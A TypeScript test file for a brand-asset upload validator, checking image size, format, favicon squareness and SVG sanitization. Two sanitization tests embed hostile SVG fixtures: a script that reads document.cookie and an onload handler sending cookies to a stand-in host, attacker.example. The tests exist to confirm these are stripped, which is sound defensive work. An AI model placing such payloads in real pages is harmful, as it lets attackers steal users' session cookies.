import { MAX_UPLOAD_BYTES } from '@admin/utils/brand-asset-limits/brand-asset-limits';

import { validateBrandAssetUpload } from './validate-brand-asset';

/** A minimal, CRC-less PNG — `image-size` only reads the IHDR chunk's fixed byte offsets, never validates checksums or decodes pixel data. */
const buildPngBuffer = (width: number, height: number): Buffer => {
  const buffer = Buffer.alloc(33);
  buffer.write('\x89PNG\r\n\x1a\n', 0, 'latin1');
  buffer.writeUInt32BE(13, 8);
  buffer.write('IHDR', 12, 'latin1');
  buffer.writeUInt32BE(width, 16);
  buffer.writeUInt32BE(height, 20);
  buffer[24] = 8; // bit depth
  buffer[25] = 6; // color type (RGBA)
  return buffer;
};

const pngFile = (width: number, height: number, sizeOverrideBytes?: number) => {
  const bytes = buildPngBuffer(width, height);
  const padded = sizeOverrideBytes
    ? Buffer.concat([bytes, Buffer.alloc(sizeOverrideBytes)])
    : bytes;
  return new File([new Uint8Array(padded)], 'upload.png', {
    type: 'image/png',
  });
};

const svgFile = (markup: string, filename = 'upload.svg') => {
  return new File([markup], filename, { type: 'image/svg+xml' });
};

describe(validateBrandAssetUpload, () => {
  it('accepts a square PNG for the favicon', async () => {
    const result = await validateBrandAssetUpload(pngFile(64, 64), 'favicon');

    expect(result).toEqual({
      ok: true,
      asset: {
        buffer: expect.any(Buffer),
        contentType: 'image/png',
        extension: 'png',
      },
    });
  });

  it('accepts a non-square PNG for the logo', async () => {
    const result = await validateBrandAssetUpload(pngFile(300, 80), 'logo');

    expect(result.ok).toBe(true);
  });

  it('rejects a non-square favicon with a reason naming the actual dimensions', async () => {
    const result = await validateBrandAssetUpload(pngFile(64, 40), 'favicon');

    expect(result).toEqual({
      ok: false,
      error: expect.stringContaining('64×40'),
    });
    if (!result.ok) {
      expect(result.error).toMatch(/square/i);
    }
  });

  it('rejects an empty file', async () => {
    const file = new File([], 'empty.png', { type: 'image/png' });

    const result = await validateBrandAssetUpload(file, 'logo');

    expect(result).toEqual({ ok: false, error: 'Choose a file to upload.' });
  });

  it('rejects a file over the size limit before reading its bytes', async () => {
    const file = pngFile(64, 64, MAX_UPLOAD_BYTES.favicon);

    const result = await validateBrandAssetUpload(file, 'favicon');

    expect(result).toEqual({
      ok: false,
      error: expect.stringContaining('too large'),
    });
  });

  it('rejects a format it can read but never lets through, regardless of the declared MIME type', async () => {
    const gifBuffer = Buffer.alloc(10);
    gifBuffer.write('GIF89a', 0, 'latin1');
    gifBuffer.writeUInt16LE(64, 6); // width
    gifBuffer.writeUInt16LE(64, 8); // height
    const file = new File([new Uint8Array(gifBuffer)], 'upload.gif', {
      type: 'image/gif',
    });

    const result = await validateBrandAssetUpload(file, 'logo');

    expect(result).toEqual({
      ok: false,
      error: 'Choose a PNG, JPEG, WebP, or SVG image.',
    });
  });

  it('accepts a clean square SVG for the favicon', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>';

    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');

    expect(result).toEqual({
      ok: true,
      asset: {
        buffer: expect.any(Buffer),
        contentType: 'image/svg+xml',
        extension: 'svg',
      },
    });
  });

  it('accepts a non-square SVG for the logo', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 80"><rect width="300" height="80"/></svg>';

    const result = await validateBrandAssetUpload(svgFile(svg), 'logo');

    expect(result.ok).toBe(true);
  });

  it('rejects a non-square favicon SVG using its viewBox aspect ratio', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 40"><rect width="100" height="40"/></svg>';

    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');

    expect(result).toEqual({
      ok: false,
      error: expect.stringContaining('100×40'),
    });
    if (!result.ok) {
      expect(result.error).toMatch(/square/i);
    }
  });

  it('rejects an SVG that declares no width/height/viewBox to check squareness against', async () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"></svg>';

    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');

    expect(result).toEqual({
      ok: false,
      error: "That file isn't a readable image.",
    });
  });

  it('sanitizes an embedded <script> out of an SVG logo upload instead of passing it through', async () => {
    const malicious =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><script>alert(document.cookie)</script><circle cx="12" cy="12" r="10"/></svg>';

    const result = await validateBrandAssetUpload(svgFile(malicious), 'logo');

    expect(result.ok).toBe(true);
    if (result.ok) {
      const written = result.asset.buffer.toString('utf-8');
      expect(written).not.toContain('<script');
      expect(written).not.toContain('alert(document.cookie)');
    }
  });

  it('sanitizes an onload event-handler attribute out of an SVG favicon upload instead of passing it through', async () => {
    const malicious =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="fetch(\'https://attacker.example/steal?c=\'+document.cookie)"><circle cx="12" cy="12" r="10"/></svg>';

    const result = await validateBrandAssetUpload(
      svgFile(malicious),
      'favicon',
    );

    expect(result.ok).toBe(true);
    if (result.ok) {
      const written = result.asset.buffer.toString('utf-8');
      expect(written).not.toContain('onload');
      expect(written).not.toContain('attacker.example');
    }
  });

  it('rejects unreadable bytes even when the declared MIME type claims to be an image', async () => {
    const file = new File(['not an image'], 'upload.png', {
      type: 'image/png',
    });

    const result = await validateBrandAssetUpload(file, 'logo');

    expect(result).toEqual({
      ok: false,
      error: "That file isn't a readable image.",
    });
  });

  it('rejects a logo below the minimum dimension bound', async () => {
    const result = await validateBrandAssetUpload(pngFile(8, 8), 'logo');

    expect(result).toEqual({
      ok: false,
      error: expect.stringContaining('too small'),
    });
  });
});
